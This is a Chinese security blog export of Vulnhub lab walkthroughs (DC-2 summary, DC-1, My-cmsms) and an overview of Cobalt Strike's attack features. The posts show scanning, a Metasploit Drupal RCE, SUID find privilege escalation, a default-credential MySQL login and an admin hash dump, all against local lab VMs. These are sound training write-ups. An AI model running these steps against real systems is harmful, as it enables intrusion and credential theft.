title="整体思路"></a>整体思路</h2><p>nmap扫ip，端口，发现80端口</p><p>访问web服务，是个wp框架，拿到flag1：爆破用户，cewl</p><p>用wpscan扫描到用户名，根据flag1提示用cewl生成字典，爆破。得到tom和jerry的密码</p><p>web登录jerry，发现flag2提示我们从其他的点进行突破</p><p>于是我们重新扫描全端口，发现ssh被改到了7744端口，用tom连上了ssh，在tom的home目录下，我们看到了flag3，提示我们要换到jerry</p><p>要bash命令，我们要绕过rbash。成功切换到jerry</p><p>然后发现jerry可以不用密码执行git</p><p>git提权，done！</p><h2 id="总结-amp-收获"><a href="#总结-amp-收获" class="headerlink" title="总结&amp;收获"></a>总结&amp;收获</h2><p>疑惑</p><ul><li>ssh连不上jerry，su却可以，不知道为什么</li></ul><p>不足</p><ul><li>对于工具的使用，不是很熟练，哪个工具能干什么，不是特别清楚。知道要干啥，不知道要用什么工具</li></ul><p>收获</p><ul><li>知道了cewl这么个工具，其实有点diy字典的意思</li><li>rbash绕过，第一次接触到rbash</li><li>第一次遇到ssh改到其他端口，下次就知道了，常规没扫出22端口的，服务器没开ssh服务的可能性小，改了默认端口的可能性大</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】DC-1攻略</title>
      <link href="/dc-1-walkthrough/"/>
      <url>/dc-1-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><p>用nmap扫描c段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.56.101/24</span><br></pre></td></tr></table></figure><p><img src="/img/1670418510041-29f9fce6-45e9-40b1-89a8-9edeed8d29dd.png" alt="img"></p><p>56.1是我的win10物理机，56.101是Kali，所以靶机IP是：192.168.56.104</p><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sTVC 192.168.56.104</span><br></pre></td></tr></table></figure><p><img src="/img/1670418653313-037cc0df-d191-43de-bd2e-beb04161b75d.png" alt="img"></p><p>可以看到开了22，80和111端口</p><p>22和80比较熟悉了</p><p>111还不知道是个啥</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>用<code>whatweb</code>看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.56.104/</span><br><span class="line"></span><br><span class="line">&#123;http://192.168.56.104/ [200 OK] Apache[2.2.22], </span><br><span class="line">Content-Language[en], Country[RESERVED][ZZ], Drupal, </span><br><span class="line">HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], </span><br><span class="line">IP[192.168.56.104], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], </span><br><span class="line">PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], </span><br><span class="line">Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], </span><br><span class="line">X-Powered-By[PHP/5.4.45-0+deb7u14] &#125;</span><br></pre></td></tr></table></figure><p>可以看到，用的CMS叫<code>Drupal</code>，版本是<code>Drupal 7</code></p><h2 id="search-exp"><a href="#search-exp" class="headerlink" title="search exp"></a>search exp</h2><p>我看了网上很多WP，直接一来就上msf搜，然后就说直接用2018年那个exp，也不说明为什么那个可以用（除了有一个说了：从最新日期的exp一个个试出来的，其他的都写的水的一批），你根本不知道他为什么要用那个exp，好像他在打靶机的时候，拿着别人的wp，开启上帝视角，开局就知道用哪个，没有任何判断。当然不排除写wp的人知道怎么判断的，但wp没有写出来，这种平铺直述的wp，你可以照做，但如果你不加任何思考的照做了，这对你个人的渗透思维的建立是极大的阻碍。</p><p>这里我给到我的思路和判断</p><ul><li>先用searchsploit搜索</li></ul><p>searchspliot不是msf的一个模块，他是独立的，不需要进入msf环境，直接在bash里执行就好。</p><p>用searchsploit去搜索漏洞，本质上和你去<code>ExploitDB</code>这种网站搜索是一样的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit drupal 7</span><br></pre></td></tr></table></figure><p><img src="/img/1670468123121-d5ce0de3-f240-4720-aafa-6bbf66d2919f.png" alt="img"></p><p>搜出来还挺多的，还有不少的RCE，有些后面标注了Metasploit，应该是在msf里有</p><p>那我们用管道符过滤一下msf里面有的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit drupal 7 | grep Metasploit</span><br></pre></td></tr></table></figure><p><img src="/img/1670469158070-783e4fc7-d7ba-424b-b39b-9813f771b514.png" alt="img"></p><p>那我们再用msf验证一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入msf</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索drupal，这里就最好不要带上个7了，因为msf没有写那么详细</span></span><br><span class="line">search drupal</span><br></pre></td></tr></table></figure><p><img src="/img/1670469081761-9ac3a683-c194-4c64-ae0e-36d376186b80.png" alt="img"></p><p>基本和上面的差不多</p><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>我首先用了第五个，因为他的日期最近，也在searchsploit里面出现过，但是利用失败了</p><p><img src="/img/1670667292138-19c692d4-7c14-465f-bb47-5bbb53d040a5.png" alt="img"></p><p>然后我换到第1个（msf搜索的序号为1，实际上是上面的第二个），设置一波参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.56.104</span><br><span class="line">set lhost 192.168.56.101</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">其他的默认就好</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/img/1670667579179-c82d1886-76e9-46f9-a5f8-39027a626719.png" alt="img"></p><p>成功拿下shell</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>我个人喜欢先看suid提权，因为简单啊。内核提权还要去找脚本下脚本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">寻找有suid权限的命令</span></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>然后看到<code>find</code>有suid权限，find提权，这不直接就拿下了吗？</p><p><img src="/img/1670669696014-0639e8ba-8943-4542-a5a1-2f542b5f9cb9.png" alt="img"></p><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>找<code>/root</code>目录下的flag文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat thefinalflag.txt</span><br></pre></td></tr></table></figure><p><img src="/img/1670669793459-f8e8f751-52d5-4329-8693-c7bbdaf853e0.png" alt="img"></p><p>完结撒花~</p><h1 id="总结提升"><a href="#总结提升" class="headerlink" title="总结提升"></a>总结提升</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>扫描c段拿到IP，扫面端口看开设的服务</p><p>发现80端口使用的是开源CMS-Drupal，找nday</p><p>存在RCE的nday，直接拿到shell</p><p>通过suid的find提权，拿到root权限，最终拿到flag</p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>看了下其他博客的思路，记录下不同点</p><ul><li>在拿shell的时候，有的师傅是根据sql注入写入管理员账号的nday打下来的，本质都差不多，我这个更加简单些</li><li>才知道一共有5个flag，正打算去找其他flag的时候，去靶机下载的地方看了下作者的描述</li></ul><blockquote><p>There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this, however, you will require root privileges.</p><p>Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</p></blockquote><p>意思是：一共有5个flag，直接找最终的flag也是可以的</p><p>所以我就没再去找剩下四个flag</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike 4 介绍</title>
      <link href="/cobalt-strike-4-introduction/"/>
      <url>/cobalt-strike-4-introduction/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>cobalt strike(简称CS）是一款团队作战渗透测试神器，分为客户端及服务端，一个服务端可以对应多个客户端，一个客户端可以连接多个服务端。</p><p>Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</p><h1 id="CS与MSF"><a href="#CS与MSF" class="headerlink" title="CS与MSF"></a>CS与MSF</h1><p>metasploit是一款开源框架，armitage是metasploit框架的图形化界面方式, cobalt strike是armitage的增强版，同时也是收费软件。cobalt strike在2.0版本还是依托metasploit，在3.0之后的版本使用单独的平台。</p><h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><p>agscript：拓展应用的脚本</p><p>c2lint：用于检查profile的错误异常</p><p>teamserver：服务端程序</p><p>cobaltstrike,cobaltstrike.jar：客户端程序(java跨平台)</p><p>logs：目录记录与自标主机的相关信息</p><p>update,update.jar：用于更新CS</p><p>third-party：第三方工具</p><h1 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h1><p>1、下载安装包</p><p>2、将整个包移到服务器（teamserver只能在Linux上运行）</p><p>3、给<code>teamserver</code>+x（可执行权限）</p><p>4、启动服务器（修改默认端口vim teamserver –&gt; 最后，可以改端口）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver &lt;host ip&gt; &lt;passwd&gt;</span><br></pre></td></tr></table></figure><p>5、客户端打开bat或sh</p><h1 id="功能点"><a href="#功能点" class="headerlink" title="功能点"></a>功能点</h1><h2 id="Atacks"><a href="#Atacks" class="headerlink" title="Atacks"></a>Atacks</h2><ul><li><p>Packages</p></li><li><ul><li>HTML Application：生成.hta HTML应用程序</li><li>MS Office Macro：生成恶意宏放入office文件</li><li>Payload Generator：生成各种语言版本的payload</li><li>Windows Executable：可执行文件默认x86勾选x64表示包含x64</li><li>Windows Executable(S)：stageless生成全功能被控端</li></ul></li><li><p>Web Drive-By</p></li><li><ul><li>Manage：管理当前Team Server开启的所有web服务Clone Site克隆某网站</li><li>Host File：在Team Server的某端口提供Web以供下载某文件</li><li>Scripted Web Delivery：为payload提供web服务以便于下载和执行</li><li>Signed Applet Attack：启动一个Web服务以提供自签名Java Applet的运行环境</li><li>Smart Applet Attack：自动检测Java版本并利用已知的exploits绕过security sandbox</li><li>System Profiler：用来获取系统信息:系统版本，Flash版本，浏览器版本等</li></ul></li><li><p>Spear Phish：鱼叉钓鱼邮件功能</p></li></ul><h2 id="右键"><a href="#右键" class="headerlink" title="右键"></a>右键</h2><ul><li><p>Interact：交互</p></li><li><p>Access</p></li><li><ul><li>Dump Hashes</li><li>Elevate：提权</li><li>Golden Ticket</li><li>Make Token</li><li>One-liner</li><li>Run Mimikatz</li><li>Spawn As</li></ul></li><li><p>Explore</p></li><li><ul><li>Browser Povot</li><li>Desktop(VNC)</li></ul></li></ul><p>一般很卡，带宽不够</p><ul><li><ul><li>File Browser</li><li>Net View</li><li>Port Scan</li><li>Process List</li><li>Screenshot</li></ul></li><li><p>Pivoting</p></li><li><p>Spawn</p></li><li><p>Session</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】My cmsms攻略</title>
      <link href="/my-cmsms-walkthrough/"/>
      <url>/my-cmsms-walkthrough/</url>
      
        <content type="html"><![CDATA[<p>最近在打vulhub靶场，群里和大佬交流的时候，他告诉我一个Up主，然后我就去看了那个up的视频，跟着他打一些靶场，总比自己随随便便选一个要好。</p><p>写wp的初衷是记录自己的不足，也便于自己打完之后总结梳理整体思路，所以我的wp可能废话比较多。有些思路走到后面发现是错的，我也会写出来，不会因此删去那些想法。我觉得在你看到我的wp的时候，看到我的一些错误的思路，我踩过的坑，哪怕他在这个靶机上行不通，但它确实是一个思路。还有我看别人wp知道的新思路，新工具，我也都会记录在我的wp里</p><p>网上有大量平铺直述的wp，你打靶机，是为了扩展思路，还是简单的跟着wp做个复现，这个要搞清楚。</p><p>废话不多说了，开始吧！</p><h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><p>老样子，下载资源 <a href="https://vulnhub.com/entry/my-cmsms-1,498/">在这</a> ，自己下载好导入虚拟机即可</p><p><strong>参考链接</strong></p><p><a href="https://blog.csdn.net/hesysd/article/details/127753704">My-cmsms 靶机_匿名用户2的博客-CSDN博客</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><p>这次的靶机，一打开，就显示了IP，直接拿到IP，不需要扫描啥的了</p><p><img src="/img/1669900651601-5c8f0828-2ec0-42a2-8bc2-7933a477add0.png" alt="img"></p><p><strong>靶机：192.168.56.102Kali：192.168.56.101</strong></p><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>拿到IP之后，我们要看一下，这个IP开放了哪些服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -sTVC 192.168.56.102</span></span><br><span class="line"></span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 27:21:9e:b5:39:63:e9:1f:2c:b2:6b:d3:3a:5f:31:7b (RSA)</span><br><span class="line">|   256 bf:90:8a:a5:d7:e5:de:89:e6:1a:36:a1:93:40:18:57 (ECDSA)</span><br><span class="line">|_  256 95:1f:32:95:78:08:50:45:cd:8c:7c:71:4a:d4:6c:1c (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Home - My CMS</span><br><span class="line">|_http-generator: CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.</span><br><span class="line">3306/tcp open  mysql   MySQL 8.0.19</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 8.0.19</span><br><span class="line">|   Thread ID: 13</span><br><span class="line">|   Capabilities flags: 65535</span><br><span class="line">|   Some Capabilities: LongPassword, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, ODBCClient, FoundRows, Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, Speaks41ProtocolOld, ConnectWithDatabase, LongColumnFlag, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: n\x11!L.d%0v%K=rX\x0FNJta2</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">| ssl-cert: Subject: commonName=MySQL_Server_8.0.19_Auto_Generated_Server_Certificate</span><br><span class="line">| Not valid before: 2020-03-25T09:30:14</span><br><span class="line">|_Not valid after:  2030-03-23T09:30:14</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>可以看到开了三个端口，22-SSH，80-HTTP，3306-MySQL</p><p>有搞头的也就是80和3306，一个对外开放了web服务，一个是数据库</p><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>看以看到这里的web服务是一套CMS，我在看别人WP的时候，看到Kali内置了一个工具可以识别CMS，我之前没用过，码住了！这个工具是 <code>whatweb</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">whatweb http://192.168.56.102</span>      </span><br><span class="line"></span><br><span class="line">http://192.168.56.102 [200 OK] Apache[2.4.38], </span><br><span class="line">CMS-Made-Simple[2.2.13], Cookies[CMSSESSID2a2f83428536], </span><br><span class="line">Country[RESERVED][ZZ], HTML5, </span><br><span class="line">HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], </span><br><span class="line">IP[192.168.56.102], JQuery[1.11.1], </span><br><span class="line">MetaGenerator[CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.], </span><br><span class="line">Script[text/javascript], Title[Home - My CMS]</span><br></pre></td></tr></table></figure><p>可以看到，扫出来的东西还是可以的，扫到了CMS的具体版本（虽然这在web页面也可以看到，但有时候难免会有遗漏的，这个挺方便），我之前都是用物理机的浏览器插件。</p><p>拿到一个CMS的时候，首先想到的是，NDay！于是我上网搜索了cmsms的漏洞</p><p>看到两个RCE，不过都不适用于这个版本，放弃</p><p>然后我又<strong>目录扫描</strong>了一波</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.102/</span><br><span class="line"></span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/admin/                                                                                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/assets/                                                                                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/doc/                                                                                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/                                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/modules/                                                                                                             </span><br><span class="line">+ http://192.168.56.102/phpinfo.php (CODE:200|SIZE:90278)                                                                                                 </span><br><span class="line">+ http://192.168.56.102/phpmyadmin (CODE:401|SIZE:461)                                                                                                    </span><br><span class="line">+ http://192.168.56.102/server-status (CODE:403|SIZE:279)                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/tmp/                                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/uploads/                                                                                                             </span><br><span class="line">                                                                                                                                                          </span><br><span class="line">---- Entering directory: http://192.168.56.102/admin/ ----</span><br><span class="line">+ http://192.168.56.102/admin/index.php (CODE:302|SIZE:0)                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/admin/lang/                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/admin/plugins/                                                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/admin/templates/                                                                                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/admin/themes/                                                                                                        </span><br><span class="line">                                                                                                                                                          </span><br><span class="line">---- Entering directory: http://192.168.56.102/doc/ ----</span><br><span class="line">+ http://192.168.56.102/doc/index.html (CODE:200|SIZE:24)                                                                                                 </span><br><span class="line">+ http://192.168.56.102/doc/robots.txt (CODE:200|SIZE:121)                                                                                                </span><br><span class="line">                                                                                                                                                          </span><br><span class="line">---- Entering directory: http://192.168.56.102/lib/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/assets/                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/classes/                                                                                                         </span><br><span class="line">+ http://192.168.56.102/lib/index.html (CODE:200|SIZE:24)                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/jquery/                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/lang/                                                                                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/phpmailer/                                                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/plugins/                                                                                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/smarty/                                                                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.102/lib/tasks/                                                                             </span><br></pre></td></tr></table></figure><p>没啥进展</p><h3 id="3306"><a href="#3306" class="headerlink" title="3306"></a>3306</h3><p>之前打的靶机都是只开放了22和80端口，这台机子开了3306，一看就是MySQL服务，我们直接用默认账号密码连一下，发现连接成功了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h http://192.168.56.102/ -u root -p</span><br></pre></td></tr></table></figure><p>然后输入密码：root，发现成功进入</p><p><img src="/img/1670218233582-bc124b33-b628-40e4-a11f-3fb74be9d650.png" alt="img"></p><blockquote><p>这里我实在是太傻了，一直不知道那个箭头是干啥的，因为我在我的Windows上用mysql几乎都是用的Navicat图形化操作的，只有在学校刚学mysql那阵子用过命令行。</p><p>用过Navicat的应该知道，不打分号也是可以执行的，所以我在这里迷糊了好一阵，才想起用<code>;</code>去结束一句sql</p></blockquote><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>先看看有哪些数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| cmsms_db           |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p>看这个命名，就大概知道，<code>cmsms_db</code>是80端口的站点数据库，后面几个都是mysql自带的。</p><p>进入<code>cmsms_db</code>看看有啥表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">use cmsms_db;</span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">+--------------------------------+</span><br><span class="line">| Tables_in_cmsms_db             |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| cms_additional_users           |</span><br><span class="line">| cms_additional_users_seq       |</span><br><span class="line">| cms_admin_bookmarks            |</span><br><span class="line">| cms_admin_bookmarks_seq        |</span><br><span class="line">| cms_adminlog                   |</span><br><span class="line">| cms_content                    |</span><br><span class="line">| cms_content_props              |</span><br><span class="line">| cms_content_props_seq          |</span><br><span class="line">| cms_content_seq                |</span><br><span class="line">| cms_event_handler_seq          |</span><br><span class="line">| cms_event_handlers             |</span><br><span class="line">| cms_events                     |</span><br><span class="line">| cms_events_seq                 |</span><br><span class="line">| cms_group_perms                |</span><br><span class="line">| cms_group_perms_seq            |</span><br><span class="line">| cms_groups                     |</span><br><span class="line">| cms_groups_seq                 |</span><br><span class="line">| cms_layout_design_cssassoc     |</span><br><span class="line">| cms_layout_design_tplassoc     |</span><br><span class="line">| cms_layout_designs             |</span><br><span class="line">| cms_layout_stylesheets         |</span><br><span class="line">| cms_layout_templates           |</span><br><span class="line">| cms_layout_tpl_addusers        |</span><br><span class="line">| cms_layout_tpl_categories      |</span><br><span class="line">| cms_layout_tpl_type            |</span><br><span class="line">| cms_locks                      |</span><br><span class="line">| cms_mod_cmsjobmgr              |</span><br><span class="line">| cms_mod_filepicker_profiles    |</span><br><span class="line">| cms_module_deps                |</span><br><span class="line">| cms_module_news                |</span><br><span class="line">| cms_module_news_categories     |</span><br><span class="line">| cms_module_news_categories_seq |</span><br><span class="line">| cms_module_news_fielddefs      |</span><br><span class="line">| cms_module_news_fieldvals      |</span><br><span class="line">| cms_module_news_seq            |</span><br><span class="line">| cms_module_search_index        |</span><br><span class="line">| cms_module_search_items        |</span><br><span class="line">| cms_module_search_items_seq    |</span><br><span class="line">| cms_module_search_words        |</span><br><span class="line">| cms_module_smarty_plugins      |</span><br><span class="line">| cms_module_templates           |</span><br><span class="line">| cms_modules                    |</span><br><span class="line">| cms_permissions                |</span><br><span class="line">| cms_permissions_seq            |</span><br><span class="line">| cms_routes                     |</span><br><span class="line">| cms_siteprefs                  |</span><br><span class="line">| cms_user_groups                |</span><br><span class="line">| cms_userplugins                |</span><br><span class="line">| cms_userplugins_seq            |</span><br><span class="line">| cms_userprefs                  |</span><br><span class="line">| cms_users                      |</span><br><span class="line">| cms_users_seq                  |</span><br><span class="line">| cms_version                    |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure><p>对 <code>cms_users</code> 产生兴趣，猜测里面存储的是站点的用户信息，拿到之后，可以直接登录站点。</p><p>看看这个表里都有啥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select * from cms_users;</span><br><span class="line"></span><br><span class="line">+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+                                                                  </span><br><span class="line">| user_id | username | password                         | admin_access | first_name | last_name | email             | active | create_date         | modified_date       |                                                                  </span><br><span class="line">+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+                                                                  </span><br><span class="line">|       1 | admin    | fb67c6d24e756229aab021cea7605fb3 |            1 |            |           | admin@mycms.local |      1 | 2020-03-25 09:38:46 | 2020-03-26 10:49:17 |                                                                  </span><br><span class="line">+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+ 